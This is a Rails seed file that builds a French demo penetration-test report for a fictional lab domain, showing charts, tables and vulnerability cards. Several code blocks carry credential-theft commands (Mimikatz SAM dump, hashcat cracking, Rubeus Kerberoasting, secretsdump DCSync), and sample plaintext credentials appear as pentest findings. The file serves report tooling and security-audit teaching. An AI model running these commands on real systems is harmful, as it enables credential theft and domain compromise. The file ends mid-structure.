# Pre-built demo report with all block types
# Run: bin/rails db:seed

demo_content = {
  version: "1.0",
  meta: {},
  blocks: [
    {
      id: "b_demo_001", type: "section-title", children: [],
      data: { text: "Rapport de test d'intrusion — ZeroLab", level: 1 }
    },
    {
      id: "b_demo_002", type: "text", children: [],
      data: { content: "Ce rapport présente les résultats du test d'intrusion réalisé sur l'infrastructure <code class=\"arbor-cartouche\">Active Directory</code> de la société <code class=\"arbor-cartouche\">ZeroLab</code>. L'audit a été conduit sur une période de 5 jours, couvrant le périmètre réseau interne (<code class=\"arbor-cartouche\">192.168.5.0/24</code>) ainsi que les services exposés." }
    },
    {
      id: "b_demo_003", type: "separator", children: [],
      data: { style: "line" }
    },
    {
      id: "b_demo_004", type: "section-title", children: [],
      data: { text: "1. Périmètre et méthodologie", level: 2 }
    },
    {
      id: "b_demo_005", type: "text", children: [],
      data: { content: "L'approche adoptée suit la méthodologie <code class=\"arbor-cartouche\">OWASP Testing Guide v4</code> combinée aux recommandations <code class=\"arbor-cartouche\">PTES</code> (Penetration Testing Execution Standard). Les tests ont été réalisés en mode <code class=\"arbor-cartouche\">grey-box</code> avec un compte utilisateur standard sur le domaine." }
    },
    {
      id: "b_demo_006", type: "callout", children: [],
      data: { variant: "info", content: "Environnement de test : <code class=\"arbor-cartouche\">VMware Workstation</code> — 3 VMs sur <code class=\"arbor-cartouche\">VMnet8</code> (192.168.5.0/24). Pare-feu Windows désactivé pour les besoins du TP." }
    },
    {
      id: "b_demo_007", type: "table", children: [],
      data: {
        title: "Périmètre audité",
        meta: [{ label: "Réseau", value: "192.168.5.0/24" }, { label: "Date", value: "25/03/2026" }],
        columns: [
          { id: "hostname", header: "Machine", type: "mono", align: "left", config: {} },
          { id: "role", header: "Rôle", type: "text", align: "left", config: {} },
          { id: "os", header: "OS", type: "text", align: "left", config: {} },
          { id: "ip", header: "IP", type: "mono", align: "left", config: {} },
          { id: "status", header: "Statut", type: "status-dot", align: "center", config: { colorMap: { online: { color: "#27ae60", label: "En ligne" }, offline: { color: "#c0392b", label: "Hors ligne" } } } }
        ],
        rows: [
          { id: "r1", cells: { hostname: "LLDAP01", role: "DC racine — serval.int", os: "Windows Server 2022", ip: "192.168.5.10", status: "online" } },
          { id: "r2", cells: { hostname: "PLDAP01", role: "DC enfant — dev.serval.int", os: "Windows Server 2022", ip: "192.168.5.11", status: "online" } },
          { id: "r3", cells: { hostname: "CLIIT-01", role: "Client IT — Paris", os: "Windows 10 Pro", ip: "192.168.5.12", status: "online" } }
        ],
        groups: [], groupByColumn: nil, showMasked: false,
        accentBorderColumn: nil, legend: nil, summaryBar: nil, preset: nil
      }
    },
    {
      id: "b_demo_008", type: "spacer", children: [],
      data: { height: 16 }
    },
    {
      id: "b_demo_009", type: "section-title", children: [],
      data: { text: "2. Résultats de l'énumération", level: 2 }
    },
    {
      id: "b_demo_010", type: "text", children: [],
      data: { content: "L'énumération <code class=\"arbor-cartouche\">Active Directory</code> via <code class=\"arbor-cartouche\">BloodHound</code> a révélé plusieurs chemins d'attaque critiques vers le groupe <code class=\"arbor-cartouche\">Domain Admins</code>. Le collecteur <code class=\"arbor-cartouche\">SharpHound</code> a identifié 12 utilisateurs, 8 groupes et 3 GPO mal configurées." }
    },
    {
      id: "b_demo_011", type: "code", children: [],
      data: {
        language: "powershell",
        code: "# Collecte BloodHound\nImport-Module SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -Domain dev.serval.int\n\n# Résultat : 3 fichiers JSON générés\n# - computers.json (3 entries)\n# - users.json (12 entries)\n# - groups.json (8 entries)"
      }
    },
    {
      id: "b_demo_012", type: "callout", children: [],
      data: { variant: "warning", content: "Attention : le compte <code class=\"arbor-cartouche\">apopov</code> (IT Sys Admin) dispose de privilèges <code class=\"arbor-cartouche\">GenericAll</code> sur le groupe <code class=\"arbor-cartouche\">Domain Admins</code> — escalade triviale." }
    },
    {
      id: "b_demo_013", type: "image", children: [],
      data: {
        images: [
          { url: "https://upload.wikimedia.org/wikipedia/commons/b/b1/Htop.png", caption: "BloodHound — Chemin d'attaque vers Domain Admin" },
          { url: "https://upload.wikimedia.org/wikipedia/commons/c/cb/Terminal-linux-root.png", caption: "SharpHound — Collecte des données AD" }
        ],
        magnification: true
      }
    },
    # — Port Scan: Universal Table showcase (badge, mono, status-dot, score-badge) —
    {
      id: "b_demo_013b", type: "table", children: [],
      data: {
        title: "Résultats du scan de ports — LLDAP01",
        meta: [{ label: "Cible", value: "192.168.5.10" }, { label: "Scanner", value: "nmap -sV -sC" }, { label: "Date", value: "25/03/2026" }],
        columns: [
          { id: "port", header: "Port", type: "mono", align: "center", config: {} },
          { id: "proto", header: "Proto", type: "badge", align: "center", config: { colorMap: { TCP: { bg: "#3498db20", text: "#3498db" }, UDP: { bg: "#9b59b620", text: "#9b59b6" } } } },
          { id: "state", header: "État", type: "badge", align: "center", config: { colorMap: { open: { bg: "#27ae60", text: "#fff", label: "Ouvert" }, filtered: { bg: "#f39c12", text: "#fff", label: "Filtré" }, closed: { bg: "#c0392b", text: "#fff", label: "Fermé" } } } },
          { id: "service", header: "Service", type: "text", align: "left", config: {} },
          { id: "version", header: "Version", type: "mono", align: "left", config: {} },
          { id: "risk", header: "Risque", type: "score-badge", align: "center", config: { ranges: [{ min: 8, max: 10, bg: "#F8D7DA", text: "#842029" }, { min: 5, max: 7, bg: "#FDDCB5", text: "#9C4221" }, { min: 2, max: 4, bg: "#FFF3CD", text: "#856404" }, { min: 0, max: 1, bg: "#D4EDDA", text: "#2D7A47" }] } }
        ],
        rows: [
          { id: "ps1", cells: { port: "53", proto: "TCP", state: "open", service: "DNS", version: "Microsoft DNS 6.1", risk: 3 } },
          { id: "ps2", cells: { port: "88", proto: "TCP", state: "open", service: "Kerberos", version: "Microsoft Windows Kerberos", risk: 7 } },
          { id: "ps3", cells: { port: "135", proto: "TCP", state: "open", service: "MSRPC", version: "Microsoft Windows RPC", risk: 5 } },
          { id: "ps4", cells: { port: "389", proto: "TCP", state: "open", service: "LDAP", version: "Microsoft Windows AD LDAP", risk: 8 } },
          { id: "ps5", cells: { port: "445", proto: "TCP", state: "open", service: "SMB", version: "Windows Server 2022 Build 20348", risk: 9 } },
          { id: "ps6", cells: { port: "636", proto: "TCP", state: "filtered", service: "LDAPS", version: "—", risk: 2 } },
          { id: "ps7", cells: { port: "3389", proto: "TCP", state: "open", service: "RDP", version: "Microsoft Terminal Services", risk: 6 } },
          { id: "ps8", cells: { port: "5985", proto: "TCP", state: "open", service: "WinRM", version: "Microsoft HTTPAPI httpd 2.0", risk: 8 } }
        ],
        groups: [], groupByColumn: nil, showMasked: false,
        accentBorderColumn: "state", legend: nil, summaryBar: nil, preset: nil
      }
    },
    {
      id: "b_demo_014", type: "separator", children: [],
      data: { style: "dots" }
    },
    {
      id: "b_demo_015", type: "section-title", children: [],
      data: { text: "3. Extraction de credentials", level: 2 }
    },
    {
      id: "b_demo_016", type: "text", children: [],
      data: { content: "L'extraction des hashes <code class=\"arbor-cartouche\">NT</code> depuis la base <code class=\"arbor-cartouche\">SAM</code> locale et la mémoire <code class=\"arbor-cartouche\">LSASS</code> a permis de récupérer les credentials de 8 comptes sur 12. Le craquage via <code class=\"arbor-cartouche\">Hashcat</code> avec la wordlist <code class=\"arbor-cartouche\">rockyou.txt</code> a abouti en moins de 2 minutes pour les mots de passe faibles." }
    },
    {
      id: "b_demo_017", type: "code", children: [],
      data: {
        language: "bash",
        code: "# Extraction SAM avec Mimikatz\nmimikatz # privilege::debug\nmimikatz # lsadump::sam\n\n# Craquage NTLMv2\nhashcat -m 5600 hashes.txt rockyou.txt --force\n# Status: Cracked 8/12 (66.7%)"
      }
    },
    {
      id: "b_demo_018", type: "table", children: [],
      data: {
        title: "Credentials récupérés",
        meta: [{ label: "Méthode", value: "SAM + LSASS + Hashcat" }],
        columns: [
          { id: "user", header: "Compte", type: "mono", align: "left", config: {} },
          { id: "hash", header: "Hash NT", type: "mono", align: "left", config: { maxWidth: 180 } },
          { id: "pass", header: "Mot de passe", type: "masked", align: "left", config: {} },
          { id: "time", header: "Temps", type: "text", align: "center", config: {} },
          { id: "sev", header: "Sévérité", type: "badge", align: "center", config: { colorMap: { critical: { bg: "#c0392b", text: "#fff", label: "Critique" }, high: { bg: "#e67e22", text: "#fff", label: "Élevé" }, low: { bg: "#27ae60", text: "#fff", label: "Faible" } } } }
        ],
        rows: [
          { id: "c1", cells: { user: "aconor", hash: "aad3b435...7cb1c8a9", pass: "Password!", time: "< 1s", sev: "critical" } },
          { id: "c2", cells: { user: "klindsay", hash: "b4b94716...2f8e01d2", pass: "Azerty123", time: "3s", sev: "critical" } },
          { id: "c3", cells: { user: "fkidd", hash: "e19ccf75...9a8b4567", pass: "Summer2025!", time: "45s", sev: "high" } },
          { id: "c4", cells: { user: "apopov", hash: "cc36a49e...d4f82b13", pass: "Non cracké", time: "—", sev: "low" } }
        ],
        groups: [], groupByColumn: nil, showMasked: false,
        accentBorderColumn: "sev", legend: nil, summaryBar: nil, preset: nil
      }
    },
    {
      id: "b_demo_019", type: "callout", children: [],
      data: { variant: "danger", content: "Critique : 66% des mots de passe ont été craqués en moins d'une minute. La politique de mot de passe par défaut du domaine est insuffisante." }
    },
    {
      id: "b_demo_020", type: "section-title", children: [],
      data: { text: "4. Recommandations", level: 2 }
    },
    {
      id: "b_demo_021", type: "callout", children: [],
      data: { variant: "success", content: "Points positifs : <code class=\"arbor-cartouche\">LSASS PPL</code> activé sur le DC racine, <code class=\"arbor-cartouche\">BitLocker</code> déployé sur les postes de travail, logs de sécurité centralisés." }
    },
    {
      id: "b_demo_022", type: "table", children: [],
      data: {
        title: "Plan de remédiation",
        subtitle: "Actions classées par priorité — suivi de progression",
        meta: [{ label: "Responsable", value: "RSSI" }, { label: "Échéance", value: "Q2 2026" }],
        columns: [
          { id: "prio", header: "Priorité", type: "badge", align: "center", config: { colorMap: { P1: { bg: "#c0392b", text: "#fff" }, P2: { bg: "#e67e22", text: "#fff" }, P3: { bg: "#f39c12", text: "#fff" } } } },
          { id: "action", header: "Recommandation", type: "text", align: "left", config: {} },
          { id: "risk", header: "Risque", type: "badge", align: "center", config: { colorMap: { Critique: { bg: "#c0392b", text: "#fff" }, "Élevé": { bg: "#e67e22", text: "#fff" }, Moyen: { bg: "#f39c12", text: "#fff" } } } },
          { id: "effort", header: "Effort", type: "badge", align: "center", config: { colorMap: { Faible: { bg: "#D4EDDA", text: "#2D7A47" }, Moyen: { bg: "#FFF3CD", text: "#856404" }, "Élevé": { bg: "#FDDCB5", text: "#9C4221" } } } },
          { id: "status", header: "Statut", type: "icon-status", align: "center", config: { iconMap: { done: { symbol: "✓", color: "#27ae60" }, wip: { symbol: "◐", color: "#3498db" }, todo: { symbol: "○", color: "#9A9488" } } } },
          { id: "progress", header: "Avancement", type: "progress", align: "center", config: {} }
        ],
        rows: [
          { id: "a1", cells: { prio: "P1", action: "Déployer PSO — 14 caractères minimum", risk: "Critique", effort: "Faible", status: "done", progress: 100 } },
          { id: "a2", cells: { prio: "P1", action: "Révoquer GenericAll de apopov sur DA", risk: "Critique", effort: "Faible", status: "done", progress: 100 } },
          { id: "a3", cells: { prio: "P2", action: "Activer Credential Guard sur tous les DC", risk: "Élevé", effort: "Moyen", status: "wip", progress: 60 } },
          { id: "a4", cells: { prio: "P2", action: "Déployer LAPS pour les comptes locaux", risk: "Élevé", effort: "Moyen", status: "wip", progress: 30 } },
          { id: "a5", cells: { prio: "P3", action: "Désactiver LLMNR et NetBIOS", risk: "Moyen", effort: "Faible", status: "todo", progress: 0 } },
          { id: "a6", cells: { prio: "P3", action: "Segmenter le réseau (VLAN IT / Users)", risk: "Moyen", effort: "Élevé", status: "todo", progress: 0 } }
        ],
        groups: [], groupByColumn: nil, showMasked: false,
        accentBorderColumn: "prio", legend: nil, summaryBar: "status", preset: nil
      }
    },
    # — Drawer: Détails techniques dépliable —
    {
      id: "b_demo_023", type: "drawer",
      data: { title: "Détails techniques — Kerberoasting <span class=\"arbor-badge arbor-badge-critical\">CRITIQUE</span>", open: true },
      children: [
        {
          id: "b_demo_023a", type: "text", children: [],
          data: { content: "L'attaque <code class=\"arbor-cartouche\">Kerberoasting</code> cible les comptes de service disposant d'un <code class=\"arbor-cartouche\">SPN</code> (Service Principal Name). Le <code class=\"arbor-cartouche\">TGS</code> chiffré avec le hash NT du compte de service peut être extrait puis craqué offline." }
        },
        {
          id: "b_demo_023b", type: "code", children: [],
          data: {
            language: "powershell",
            code: "# Kerberoasting via Rubeus\n.\\Rubeus.exe kerberoast /outfile:tgs_hashes.txt\n\n# Résultat :\n# [*] Found 3 SPNs\n# [*] SPN: MSSQLSvc/SQL01.serval.int → svc_sql\n# [*] SPN: HTTP/web01.serval.int  → svc_iis\n# [*] SPN: CIFS/fs01.serval.int   → svc_backup"
          }
        },
        {
          id: "b_demo_023c", type: "callout", children: [],
          data: { variant: "warning", content: "Le compte <code class=\"arbor-cartouche\">svc_sql</code> utilise un mot de passe faible craqué en 12 secondes. Ce compte a des droits <code class=\"arbor-cartouche\">dbo</code> sur la base de production." }
        }
      ]
    },
    # — Drawer fermé par défaut —
    {
      id: "b_demo_024", type: "drawer",
      data: { title: "Chaîne d'attaque complète (kill chain) <span class=\"arbor-badge arbor-badge-high\">ÉLEVÉ</span>", open: false },
      children: [
        {
          id: "b_demo_024a", type: "text", children: [],
          data: { content: "1. Compromission initiale via <code class=\"arbor-cartouche\">Responder</code> (<code class=\"arbor-cartouche\">LLMNR poisoning</code>)\n2. Relay <code class=\"arbor-cartouche\">NTLMv2</code> → accès au partage IT$\n3. Récupération script GPO contenant credentials en clair\n4. Mouvement latéral vers PLDAP01 (<code class=\"arbor-cartouche\">PSExec</code>)\n5. <code class=\"arbor-cartouche\">DCSync</code> → extraction de tous les hashes du domaine" }
        },
        {
          id: "b_demo_024b", type: "code", children: [],
          data: {
            language: "bash",
            code: "# DCSync via secretsdump\nsecretsdump.py dev.serval.int/apopov@192.168.5.11 -just-dc\n\n# [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n# Administrator:500:aad3b435b51404ee:8846f7ea...\n# krbtgt:502:aad3b435b51404ee:f3bc61e9..."
          }
        }
      ]
    },
    {
      id: "b_demo_025", type: "spacer", children: [],
      data: { height: 12 }
    },
    # — Colonnes: Synthèse côte à côte —
    {
      id: "b_demo_026", type: "horizontal-div",
      data: {},
      children: [
        {
          id: "b_demo_026a", type: "callout", children: [],
          data: { variant: "danger", content: "8 vulnérabilités critiques\n3 chemins vers Domain Admin\n66% des mots de passe craqués\nDCSync possible sans détection" }
        },
        {
          id: "b_demo_026b", type: "callout", children: [],
          data: { variant: "success", content: "LSASS PPL activé sur DC racine\nBitLocker déployé partout\nLogs centralisés (Sysmon)\nCertificat HTTPS valide" }
        }
      ]
    },
    {
      id: "b_demo_027", type: "separator", children: [],
      data: { style: "dots" }
    },
    # — Colonnes: Métriques —
    {
      id: "b_demo_028", type: "horizontal-div",
      data: {},
      children: [
        {
          id: "b_demo_028a", type: "table", children: [],
          data: {
            headers: ["Métrique", "Valeur"],
            rows: [
              ["Durée de l'audit", "5 jours"],
              ["Machines testées", "3"],
              ["Vulnérabilités trouvées", "14"],
              ["Critiques / Élevées", "8 / 4"]
            ]
          }
        },
        {
          id: "b_demo_028b", type: "table", children: [],
          data: {
            headers: ["Classification", "Nombre"],
            rows: [
              ["Critique", "8"],
              ["Élevé", "4"],
              ["Moyen", "2"],
              ["Faible", "0"]
            ]
          }
        }
      ]
    },
    {
      id: "b_demo_029", type: "spacer", children: [],
      data: { height: 16 }
    },
    # — Risk Assessment (combined: OWASP risk matrix) —
    {
      id: "b_demo_034", type: "section-title", children: [],
      data: { text: "5. Évaluation des risques", level: 2 }
    },
    {
      id: "b_demo_035", type: "risk-assessment", children: [],
      data: {
        title: "Matrice de Risque (OWASP)",
        likelihood: [
          { label: "Compétences", value: 9 },
          { label: "Motivation", value: 9 },
          { label: "Opportunité", value: 9 },
          { label: "Population", value: 6 },
          { label: "Découverte", value: 3 },
          { label: "Exploitation", value: 3 },
          { label: "Sensibilisation", value: 4 },
          { label: "Détection", value: 8 }
        ],
        impact: [
          { label: "Confidentialité", value: 9 },
          { label: "Intégrité", value: 9 },
          { label: "Disponibilité", value: 9 },
          { label: "Traçabilité", value: 9 },
          { label: "Financier", value: 9 },
          { label: "Réputation", value: 9 },
          { label: "Non-conformité", value: 7 },
          { label: "Vie privée", value: 9 }
        ],
        max: 9,
        xLabel: "Vraisemblance", yLabel: "Impact"
      }
    },
    {
      id: "b_demo_036", type: "spacer", children: [],
      data: { height: 12 }
    },
    # — Standalone score gauges (segmented) —
    {
      id: "b_demo_037", type: "score-gauge", children: [],
      data: {
        title: "Facteurs de Vraisemblance (6.4)",
        scores: [
          { label: "Compétences", value: 9 },
          { label: "Motivation", value: 9 },
          { label: "Opportunité", value: 9 },
          { label: "Population", value: 6 },
          { label: "Découverte", value: 3 },
          { label: "Exploitation", value: 3 },
          { label: "Sensibilisation", value: 4 },
          { label: "Détection", value: 8 }
        ],
        max: 9
      }
    },
    {
      id: "b_demo_038", type: "spacer", children: [],
      data: { height: 12 }
    },
    # — Standalone risk matrix 3x3 with point —
    {
      id: "b_demo_039", type: "risk-matrix", children: [],
      data: {
        xLabel: "Vraisemblance", yLabel: "Impact",
        points: [
          { label: "Score global", x: 0.83, y: 0.83 }
        ]
      }
    },
    {
      id: "b_demo_040", type: "spacer", children: [],
      data: { height: 12 }
    },
    # — Text with severity badges —
    {
      id: "b_demo_041", type: "text", children: [],
      data: { content: "L'analyse révèle <span class=\"arbor-badge arbor-badge-critical\">5 CRITIQUES</span> dont la <code class=\"arbor-cartouche\">RCE</code> par désérialisation et l'injection <code class=\"arbor-cartouche\">SQL</code>, <span class=\"arbor-badge arbor-badge-high\">4 ÉLEVÉS</span> incluant la faiblesse <code class=\"arbor-cartouche\">JWT</code> et le <code class=\"arbor-cartouche\">CORS</code> excessif, <span class=\"arbor-badge arbor-badge-medium\">5 MOYENS</span> et <span class=\"arbor-badge arbor-badge-low\">5 FAIBLES</span>. La remédiation prioritaire concerne les vulnérabilités classées <span class=\"arbor-badge arbor-badge-critical\">CRITIQUE</span> et <span class=\"arbor-badge arbor-badge-high\">ÉLEVÉ</span>." }
    },
    {
      id: "b_demo_042", type: "separator", children: [],
      data: { style: "line" }
    },
    {
      id: "b_demo_043", type: "section-title", children: [],
      data: { text: "Répartition des vulnérabilités", level: 2 }
    },
    {
      id: "b_demo_044", type: "bar-chart", children: [],
      data: {
        title: "Vulnérabilités par sévérité",
        orientation: "vertical",
        showValues: true,
        items: [
          { label: "Critique", value: 5, color: "#c0392b" },
          { label: "Élevé", value: 8, color: "#e67e22" },
          { label: "Moyen", value: 12, color: "#f39c12" },
          { label: "Faible", value: 4, color: "#27ae60" },
          { label: "Info", value: 7, color: "#2980b9" }
        ]
      }
    },
    {
      id: "b_demo_045", type: "spacer", children: [],
      data: { height: 16 }
    },
    {
      id: "b_demo_046", type: "bar-chart", children: [],
      data: {
        title: "Temps de remédiation estimé (jours)",
        orientation: "horizontal",
        showValues: true,
        items: [
          { label: "RCE Deser.", value: 15, color: "#c0392b" },
          { label: "SQLi Auth", value: 10, color: "#c0392b" },
          { label: "JWT Weak", value: 5, color: "#e67e22" },
          { label: "CORS", value: 3, color: "#e67e22" },
          { label: "XSS Stored", value: 7, color: "#f39c12" },
          { label: "CSRF", value: 2, color: "#f39c12" },
          { label: "Info Leak", value: 1, color: "#27ae60" }
        ]
      }
    },
    {
      id: "b_demo_047", type: "spacer", children: [],
      data: { height: 16 }
    },
    {
      id: "b_demo_048", type: "line-chart", children: [],
      data: {
        title: "Évolution des vulnérabilités par mois",
        labels: ["Jan", "Fév", "Mar", "Avr", "Mai", "Jun"],
        datasets: [
          { name: "Critiques", color: "#e74c3c", values: [3, 5, 2, 7, 4, 1] },
          { name: "Élevées", color: "#e67e22", values: [8, 6, 9, 5, 7, 4] }
        ],
        showDots: true, showArea: false
      }
    },
    {
      id: "b_demo_049", type: "pie-chart", children: [],
      data: {
        title: "Répartition par catégorie OWASP",
        items: [
          { label: "Injection", value: 28, color: "#e74c3c" },
          { label: "Broken Auth", value: 22, color: "#e67e22" },
          { label: "XSS", value: 18, color: "#f39c12" },
          { label: "Misconfig", value: 15, color: "#5B8FD4" },
          { label: "Autres", value: 17, color: "#9b59b6" }
        ],
        donut: true
      }
    },
    {
      id: "b_demo_050", type: "gauge-chart", children: [],
      data: { title: "Score de sécurité global", value: 38, max: 100, unit: "%" }
    },
    {
      id: "b_demo_051", type: "radar-chart", children: [],
      data: {
        title: "Maturité par domaine",
        axes: [
          { label: "Réseau", value: 7, max: 10 },
          { label: "Applicatif", value: 4, max: 10 },
          { label: "Identité", value: 6, max: 10 },
          { label: "Données", value: 5, max: 10 },
          { label: "Physique", value: 8, max: 10 }
        ],
        color: "#E8A855"
      }
    },
    {
      id: "b_demo_052", type: "heatmap", children: [],
      data: {
        title: "Activité suspecte par jour/heure",
        xLabels: ["00h", "04h", "08h", "12h", "16h", "20h"],
        yLabels: ["Lun", "Mar", "Mer", "Jeu", "Ven"],
        data: [[1, 0, 5, 3, 8, 2], [0, 1, 4, 6, 7, 3], [2, 0, 3, 9, 5, 1], [0, 2, 6, 4, 8, 4], [1, 0, 7, 5, 3, 0]],
        minColor: "#f0ede6", maxColor: "#e74c3c"
      }
    },
    {
      id: "b_demo_053", type: "stacked-bar", children: [],
      data: {
        title: "Vulnérabilités par trimestre",
        labels: ["Q1", "Q2", "Q3", "Q4"],
        series: [
          { name: "Critique", color: "#e74c3c", values: [3, 5, 2, 4] },
          { name: "Élevé", color: "#e67e22", values: [7, 4, 8, 6] },
          { name: "Moyen", color: "#f39c12", values: [12, 9, 15, 11] }
        ],
        orientation: "vertical"
      }
    },
    {
      id: "b_demo_054", type: "area-chart", children: [],
      data: {
        title: "Trafic réseau (Mbps)",
        labels: ["00h", "04h", "08h", "12h", "16h", "20h"],
        datasets: [
          { name: "Entrant", color: "#5B8FD4", values: [120, 80, 340, 520, 410, 260] },
          { name: "Sortant", color: "#E8A855", values: [90, 60, 280, 380, 350, 200] }
        ],
        showDots: true
      }
    },
    {
      id: "b_demo_055", type: "scatter-plot", children: [],
      data: {
        title: "CVSS vs Exploitabilité",
        xLabel: "Score CVSS", yLabel: "Exploitabilité",
        points: [
          { x: 9.1, y: 8.5, label: "CVE-2024-001", color: "#e74c3c" },
          { x: 7.5, y: 6.2, label: "CVE-2024-002", color: "#e67e22" },
          { x: 5.2, y: 3.8, label: "CVE-2024-003", color: "#f39c12" },
          { x: 3.1, y: 2.1, label: "CVE-2024-004", color: "#27ae60" },
          { x: 8.3, y: 7.0, label: "CVE-2024-005", color: "#e74c3c" },
          { x: 6.0, y: 4.5, label: "CVE-2024-006", color: "#e67e22" }
        ]
      }
    },
    {
      id: "b_demo_056", type: "sparkline", children: [],
      data: { title: "Tendance alertes (7j)", values: [12, 18, 9, 24, 15, 31, 22], color: "#e74c3c" }
    },
    {
      id: "b_demo_057", type: "funnel-chart", children: [],
      data: {
        title: "Pipeline d'attaque",
        items: [
          { label: "Reconnaissance", value: 100, color: "#5B8FD4" },
          { label: "Scan", value: 72, color: "#E8A855" },
          { label: "Exploitation", value: 38, color: "#e67e22" },
          { label: "Post-Exploit", value: 15, color: "#e74c3c" }
        ]
      }
    },
    {
      id: "b_demo_058", type: "waterfall-chart", children: [],
      data: {
        title: "Évolution du score de sécurité",
        items: [
          { label: "Initial", value: 80, type: "total" },
          { label: "Patch OS", value: -12, type: "decrease" },
          { label: "WAF", value: -8, type: "decrease" },
          { label: "Nouv. vuln", value: 5, type: "increase" },
          { label: "MFA", value: -15, type: "decrease" },
          { label: "Final", value: 50, type: "total" }
        ]
      }
    },
    {
      id: "b_demo_059", type: "treemap", children: [],
      data: {
        title: "Surface d'attaque",
        items: [
          { label: "Web Apps", value: 45, color: "#e74c3c" },
          { label: "APIs", value: 30, color: "#e67e22" },
          { label: "Réseau", value: 20, color: "#5B8FD4" },
          { label: "Mobile", value: 15, color: "#9b59b6" },
          { label: "IoT", value: 8, color: "#1abc9c" }
        ]
      }
    },
    {
      id: "b_demo_060", type: "sankey-diagram", children: [],
      data: {
        title: "Flux d'attaque",
        nodes: [
          { label: "Phishing", color: "#e74c3c" },
          { label: "Brute Force", color: "#e67e22" },
          { label: "Accès initial", color: "#5B8FD4" },
          { label: "Pivot", color: "#9b59b6" },
          { label: "Exfiltration", color: "#E8A855" }
        ],
        links: [
          { source: 0, target: 2, value: 40 },
          { source: 1, target: 2, value: 25 },
          { source: 2, target: 3, value: 50 },
          { source: 3, target: 4, value: 35 }
        ]
      }
    },
    # — Pentest Blocks Demo Section —
    {
      id: "b_demo_p00", type: "section-title", children: [],
      data: { text: "6. Blocs Pentest spécialisés", level: 2 }
    },
    {
      id: "b_demo_p01", type: "findings-summary", children: [],
      data: {
        title: "Synthèse des vulnérabilités",
        critical: 5, high: 8, medium: 12, low: 4, info: 7,
        showPercentage: true
      }
    },
    {
      id: "b_demo_p02", type: "vulnerability-card", children: [],
      data: {
        title: "Injection SQL — Formulaire d'authentification",
        severity: "critical", cvss: 9.8,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        description: "Le formulaire de login est vulnérable à une injection SQL par le paramètre 'username'. Un attaquant peut contourner l'authentification et extraire l'intégralité de la base de données.",
        remediation: "Utiliser des requêtes préparées (parameterized queries). Valider et assainir toutes les entrées utilisateur. Implémenter un WAF en complément.",
        references: [
          { title: "OWASP SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
          { title: "CWE-89", url: "https://cwe.mitre.org/data/definitions/89.html" }
        ],
        tags: ["OWASP A03:2021", "CWE-89", "SQLi"]
      }
    },
    {
      id: "b_demo_p03", type: "vulnerability-card", children: [],
      data: {
        title: "JWT Secret faible — API REST",
        severity: "high", cvss: 7.5,
        vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        description: "Le secret JWT utilisé pour signer les tokens est trop court et prédictible ('secret123'). Un attaquant peut forger des tokens arbitraires.",
        remediation: "Générer un secret cryptographiquement sûr d'au moins 256 bits. Utiliser RS256 au lieu de HS256.",
        references: [{ title: "JWT Best Practices", url: "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/" }],
        tags: ["OWASP A02:2021", "CWE-345"]
      }
    },
    {
      id: "b_demo_p04", type: "scope-block", children: [],
      data: {
        title: "Périmètre du test d'intrusion",
        inScope: [
          { target: "192.168.5.0/24", type: "network", description: "Réseau interne Active Directory" },
          { target: "https://portal.serval.int", type: "web", description: "Portail intranet" },
          { target: "api.serval.int", type: "api", description: "API REST v2" }
        ],
        outOfScope: [
          { target: "10.0.0.0/8", type: "network", description: "Réseau partenaires (convention séparée)" },
          { target: "mail.serval.int", type: "web", description: "Serveur mail (en production)" }
        ],
        notes: "Fenêtre de test : 1-5 mars 2024. Tests destructifs interdits. Contact d'urgence : RSSI +33 1 23 45 67 89."
      }
    },
    {
      id: "b_demo_p05", type: "cve-table", children: [],
      data: {
        title: "CVE identifiées lors de l'audit",
        cves: [
          { id: "CVE-2024-21762", description: "FortiOS RCE via SSL VPN (heap overflow)", cvss: 9.8, severity: "critical", vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", affected: "FortiOS 7.2.x", remediationStatus: "fixed" },
          { id: "CVE-2023-44487", description: "HTTP/2 Rapid Reset — Denial of Service", cvss: 7.5, severity: "high", vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", affected: "nginx 1.24", remediationStatus: "in_progress" },
          { id: "CVE-2023-0386", description: "Linux OverlayFS — Local Privilege Escalation", cvss: 7.8, severity: "high", vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", affected: "Kernel 5.15", remediationStatus: "open" },
          { id: "CVE-2022-26134", description: "Confluence Server RCE (OGNL Injection)", cvss: 9.8, severity: "critical", vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", affected: "Confluence 7.x", remediationStatus: "wontfix" }
        ]
      }
    },
    {
      id: "b_demo_p06", type: "cvss-calculator", children: [],
      data: {
        title: "CVSS 3.1 — Score de base (vuln principale)",
        AV: "N", AC: "L", PR: "N", UI: "N", S: "U", C: "H", I: "H", A: "H"
      }
    },
    {
      id: "b_demo_p07", type: "credentials-table", children: [],
      data: {
        title: "Identifiants découverts lors du pentest",
        showPasswords: false,
        credentials: [
          { username: "admin", password: "P@ssw0rd!", source: "Brute force", severity: "critical", type: "database", found: "2024-03-02", location: "MySQL 192.168.5.10:3306" },
          { username: "svc_backup", password: "backup_2024", source: "Config file", severity: "high", type: "ssh", found: "2024-03-03", location: "SSH 192.168.5.20" },
          { username: "deploy", password: "d3pl0y!", source: "Git history", severity: "high", type: "api", found: "2024-03-03", location: "API api.serval.int" },
          { username: "root", password: "toor", source: "Default creds", severity: "critical", type: "ssh", found: "2024-03-04", location: "IoT Gateway 192.168.5.50" }
        ]
      }
    },
    {
      id: "b_demo_p08", type: "attack-timeline", children: [],
      data: {
        title: "Kill Chain — Attaque principale",
        phases: [
          { id: "recon", label: "Reconnaissance", color: "#3498db", timestamp: "Jour 1 — 09:00", techniques: [
            { id: "T1595", name: "Active Scanning (nmap)", status: "success" },
            { id: "T1592", name: "Gather Victim Host Information", status: "success" }
          ]},
          { id: "weaponize", label: "Weaponization", color: "#9b59b6", timestamp: "Jour 1 — 14:00", techniques: [
            { id: "T1587", name: "Develop Exploit Payload", status: "success" }
          ]},
